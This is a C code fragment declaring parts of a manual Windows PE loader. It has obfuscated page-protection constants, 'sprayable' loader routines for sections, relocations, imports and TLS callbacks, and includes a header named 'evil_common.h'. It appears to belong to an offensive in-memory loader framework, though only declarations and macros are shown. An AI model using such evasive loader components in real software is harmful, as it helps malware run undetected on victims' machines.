#include "PART_DEFS.h" // LDR_MANUAL_SECTION_LOAD
#include "spraygen.h"
#include "evil_common.h"

#include <windows.h>


typedef struct {
  WORD	offset : 12;
  WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

static const BYTE gkProtmap[] = {
  ObfEncB(PAGE_NOACCESS),
  ObfEncB(PAGE_EXECUTE),
  ObfEncB(PAGE_READONLY),
  ObfEncB(PAGE_EXECUTE_READ),
  ObfEncB(PAGE_READWRITE),
  ObfEncB(PAGE_EXECUTE_READWRITE),
  ObfEncB(PAGE_READWRITE),
  ObfEncB(PAGE_EXECUTE_READWRITE)
};


SPRAYABLE_PROC(ldr_copy_sections);
SPRAYABLE_PROC(ldr_process_relocs);

SPRAYABLE_PROC(ldr_prot_sec_with);
#ifndef LDR_MANUAL_SECTION_LOAD
SPRAYABLE_PROC(ldr_prot_sec); // automatic
#endif

SPRAYABLE_PROC(ldr_process_imports);
SPRAYABLE_PROC(ldr_call_tls_callbacks);


// Image (mapped/raw) ptrs are passed through CHILD_A* args, but pointers to
// PE headers are set separately through zvars so they can be controlled externally
EXTERN_ZVAR(IMAGE_NT_HEADERS* ldr_pNtHdrs);
EXTERN_ZVAR(IMAGE_OPTIONAL_HEADER* ldr_pOptHdr);
EXTERN_ZVAR(IMAGE_SECTION_HEADER* ldr_pSecHdrs);
EXTERN_ZVAR(IMAGE_DATA_DIRECTORY* ldr_pDataDir);

EXTERN_ZVAR(LPVOID protsec_lpTargetImage); // only for ldr_prot_sec cuz it has too many args


// private
#ifdef _WIN64
#define IMAGE_BASE_ALIGN_MASK 0xFFFFFFFFFFFF0000
#define SIG_BIT_IS_SET(x) ((x & 0x8000000000000000) != 0)
#define CLEAR_SIG_BIT(x) (x & 0x7FFFFFFFFFFFFFFF)
#else
#define IMAGE_BASE_ALIGN_MASK 0xFFFF0000
#define SIG_BIT_IS_SET(x) (x & 0x80000000)
#define CLEAR_SIG_BIT(x) (x & 0x7FFFFFFF)
#endif


